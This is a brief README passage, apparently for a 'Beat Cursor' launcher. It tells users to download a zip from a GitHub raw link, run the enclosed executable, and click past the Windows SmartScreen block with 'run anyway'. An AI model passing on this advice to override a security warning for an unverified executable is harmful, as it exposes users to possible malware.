## Downloading and Installing
Go [here](https://github.com/lolapus/Beat-Cursor/raw/main/Launcher.zip) to get the launcher. You simply extract the zip folder, run "Beat Cursor Launcher.exe", and let the launcher do the heavy lifting. For some of you it might say windows smart screen has blocked the app, you can just click more info and then run anyway to open the launcher.
